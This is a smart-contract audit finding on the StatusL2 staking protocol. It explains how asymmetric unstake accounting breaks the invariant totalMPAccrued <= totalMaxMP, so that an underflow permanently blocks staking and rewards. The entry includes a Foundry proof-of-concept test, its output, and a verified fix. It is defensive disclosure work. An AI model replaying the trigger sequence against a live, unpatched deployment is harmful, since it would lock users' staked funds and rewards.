---
tags:
  - lang/solidity
  - sector/staking
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - vuln/arithmetic/underflow
  - impact/dos/permanent
  - novelty/known-pattern
  - misassumption/math-is-safe
  - fix/fix-arithmetic
protocol: "[[Statusl]]"
auditors:
  - "[[Samuraii77]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-01-05-cyfrin-statusl2-v2.0.md"
genome:
  - "[[underflow]]"
  - "[[permanent]]"
  - "[[known-pattern]]"
  - "[[dos-resistance]]"
  - "[[integer-bounds]]"
  - "[[reward-accounting]]"
  - "[[timestamp-dependence]]"
---
# Global MP cap invariant can be broken on unstake causing arithmetic underflow and permanent DoS

- id: 65329
- impact: HIGH
- protocol: [[Statusl]]
- reporter: Samuraii77 (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-01-05-cyfrin-statusl2-v2.0.md

## Summary


The bug report describes an issue with the protocol's global MP accrual logic. The protocol relies on an invariant that `totalMPAccrued` is always less than or equal to `totalMaxMP`. However, this invariant can be violated during normal protocol operation due to asymmetric updates in the `_unstake()` function. This can lead to a denial of service where staking, unstaking, and other operations become unusable. The bug has been fixed in the latest version of the protocol.

## Details

**Description:** The protocol assumes the invariant `totalMPAccrued <= totalMaxMP` always holds. This invariant is relied upon in the global MP accrual logic `_totalMP()`, which caps newly accrued MP using an unchecked subtraction:

```solidity
accruedMP = totalMaxMP - totalMPAccrued;
```

However, this invariant can be violated during normal protocol operation due to asymmetric updates in `_unstake()`.

When a vault unstakes, both its accrued MP (`vault.mpAccrued`) and its MP cap (`vault.maxMP`) are reduced proportionally to the unstaked amount:

```solidity
_deltaMpTotal = vault.mpAccrued * amount / vault.stakedBalance;
_deltaMpMax   = vault.maxMP     * amount / vault.stakedBalance;
```

These reductions are then propagated to global aggregates:

```solidity
totalMPAccrued -= _deltaMpTotal;
totalMaxMP     -= _deltaMpMax;
```

If a vault has a large MP cap but has not yet fully accrued up to that cap (a common case for recently staked or locked vaults), then `_deltaMpMax > _deltaMpTotal`. If the system is globally saturated at the time of unstake (`totalMPAccrued == totalMaxMP`), this asymmetric reduction results in:

```
totalMPAccrued_new > totalMaxMP_new
```

Once this state is reached, any subsequent call to `_updateGlobalState()` after time has advanced will revert. Specifically, `_totalMP()` attempts to clamp accrual using:

```solidity
if (totalMPAccrued + accruedMP > totalMaxMP) {
    accruedMP = totalMaxMP - totalMPAccrued;
}
```

When `totalMPAccrued > totalMaxMP`, the subtraction underflows and reverts in Solidity 0.8.x. Because `_updateGlobalState()` is invoked by most user-facing flows (`stake`, `unstake`, `lock`, `redeemRewards`, `updateVault`, etc.), this leads to a protocol-level denial of service where staking and reward interactions become permanently unusable until state is corrected.

No malicious behavior is required. A normal sequence of staking, time-based MP accrual reaching the global cap, followed by unstaking from a not-yet-saturated vault is sufficient to trigger the issue.

**Impact:** After the invariant `totalMPAccrued > totalMaxMP` is reached, all operations that call `_updateGlobalState()` revert once time advances. This results in a permanent denial of service affecting staking, unstaking, vault updates, and reward distribution.

**Proof of Concept:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import "forge-std/StdError.sol";

import { StakeManager } from "../src/StakeManager.sol";
import { StakeVault } from "../src/StakeVault.sol";
import { VaultFactory } from "../src/VaultFactory.sol";
import { MockToken } from "./mocks/MockToken.sol";

import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { Clones } from "@openzeppelin/contracts/proxy/Clones.sol";

contract StakeManagerDoSTest is Test {
    StakeManager public stakeManager;
    StakeVault public stakeVaultImpl;
    VaultFactory public vaultFactory;

    MockToken public snt;
    MockToken public karma;

    address public admin = address(0x1);
    address public userA = address(0x2);
    address public userB = address(0x3);

    function setUp() public {
        vm.startPrank(admin);

        snt = new MockToken("SNT", "SNT");
        karma = new MockToken("KARMA", "KARMA");

        StakeManager impl = new StakeManager();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeWithSelector(StakeManager.initialize.selector, admin, address(snt), address(karma))
        );
        stakeManager = StakeManager(address(proxy));

        stakeVaultImpl = new StakeVault(snt);
        vaultFactory = new VaultFactory(admin, address(stakeManager), address(stakeVaultImpl));

        // Whitelist codehash for cloned vaults
        address manualClone = Clones.clone(address(stakeVaultImpl));
        stakeManager.setTrustedCodehash(manualClone.codehash, true);

        vm.stopPrank();
    }

    function _warpAndUpdateGlobal(uint256 secondsForward) internal {
        vm.warp(block.timestamp + secondsForward);
        stakeManager.updateGlobalState();
    }

    function test_totalMPAccrued_can_exceed_totalMaxMP_causing_updateGlobalState_DoS() public {
        // 1) User B stakes first and becomes fully saturated (hits their MP cap)
        vm.startPrank(userB);
        StakeVault vaultB = vaultFactory.createVault();

        snt.mint(userB, 1000 ether);
        snt.approve(address(vaultB), 1000 ether);

        vaultB.stake(100 ether, 90 days);
        vm.stopPrank();

        // Warp far enough for B to saturate, then materialize B's MP into vault + globals
        vm.warp(block.timestamp + 4 * 365 days + 1 days);
        stakeManager.updateVault(address(vaultB));

        // 2) User A stakes later (so A has significant remaining MP gap while global accrual can still run)
        vm.startPrank(userA);
        StakeVault vaultA = vaultFactory.createVault();

        snt.mint(userA, 1000 ether);
        snt.approve(address(vaultA), 1000 ether);

        vaultA.stake(100 ether, 90 days);
        vm.stopPrank();

        // 3) Advance time until the global MP reaches the global cap (totalMPAccrued == totalMaxMP)
        // We do this in chunks to avoid relying on one magic timestamp.
        // Important: updateGlobalState() moves lastMPUpdatedTime forward each time.
        for (uint256 i = 0; i < 30; i++) {
            _warpAndUpdateGlobal(60 days);

            // Sanity: accrued should never exceed max in the "healthy" path
            assertLe(stakeManager.totalMPAccrued(), stakeManager.totalMaxMP(), "accrued should not exceed max before unstake");

            if (stakeManager.totalMPAccrued() == stakeManager.totalMaxMP()) {
                break;
            }
        }

        // Ensure we actually reached the cap; otherwise the repro won't work.
        assertEq(
            stakeManager.totalMPAccrued(),
            stakeManager.totalMaxMP(),
            "global should be capped before triggering the divergence via unstake"
        );

        // 4) Now unstake A entirely.
        // If A is not fully saturated locally, we expect:
        // - totalMaxMP decreases by deltaMax (big)
        // - totalMPAccrued decreases by deltaTotal (smaller)
        // Starting from totalMPAccrued == totalMaxMP, this can produce totalMPAccrued > totalMaxMP.
        vm.startPrank(userA);
        vaultA.unstake(100 ether);
        vm.stopPrank();

        // Prove the invariant is now broken: accrued exceeds max (this is the dangerous state)
        assertGt(
            stakeManager.totalMPAccrued(),
            stakeManager.totalMaxMP(),
            "post-unstake accrued should exceed max to trigger the underflow DoS"
        );

        // 5) Once time advances, _totalMP() will enter the cap branch and attempt:
        // accruedMP = totalMaxMP - totalMPAccrued; which underflows and reverts in Solidity 0.8.x.
        vm.warp(block.timestamp + 1);

        vm.expectRevert(stdError.arithmeticError);
        stakeManager.updateGlobalState();
    }
}
```
- Output:
```python
Ran 1 test for test/StakeManagerDoS.t.sol:StakeManagerDoSTest
[PASS] test_totalMPAccrued_can_exceed_totalMaxMP_causing_updateGlobalState_DoS() (gas: 1094540)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.34ms (1.15ms CPU time)

Ran 1 test suite in 147.18ms (4.34ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

**Recommended Mitigation:** Defensively enforce the global MP cap invariant inside `_totalMP()` by handling the case where `totalMPAccrued >= totalMaxMP` before performing any subtraction. A minimal fix is to clamp early:

```solidity
if (totalMPAccrued >= totalMaxMP) {
    return totalMaxMP;
}
```

Then compute remaining capacity safely:

```solidity
uint256 remaining = totalMaxMP - totalMPAccrued;
if (accruedMP > remaining) {
    accruedMP = remaining;
}
```

**StatusL2:** Fixed in [56a7b64](https://github.com/status-im/status-network-monorepo/commit/56a7b64a782150b2a87563621212b076e35f84f5).

**Cyfrin:** Verified.

\clearpage
